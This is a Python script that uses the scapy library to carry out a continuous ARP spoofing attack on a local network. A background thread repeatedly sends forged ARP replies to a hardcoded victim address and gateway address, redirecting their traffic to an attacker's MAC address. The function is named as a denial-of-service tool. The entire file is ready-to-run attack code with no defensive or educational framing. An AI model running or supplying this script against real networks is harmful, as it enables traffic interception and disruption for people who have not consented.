import time
import threading
from scapy.all import send
from scapy.layers.l2 import ARP

def continuous_arp_dos(
    victim_ip: str = "192.168.1.194",
    gateway_ip: str = "192.168.1.1",
    attacker_mac: str = "88:AE:DD:5D:88:22",
    iface: str = None,
    interval: float = 2.0
):
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac)

    is_running = True

    def loop():
        while is_running:
            send(pkt_to_victim, iface=iface, verbose=False)
            send(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(interval)

    # Start sending in the background
    worker = threading.Thread(target=loop, daemon=True)
    worker.start()

    print(f"[RED] Poisoning: {victim_ip} <-> {gateway_ip}")
    input("Press Enter to stop...\n")

    # Stop the loop
    is_running = False
    print("[+] Stopped.")

if __name__ == "__main__":
    continuous_arp_dos()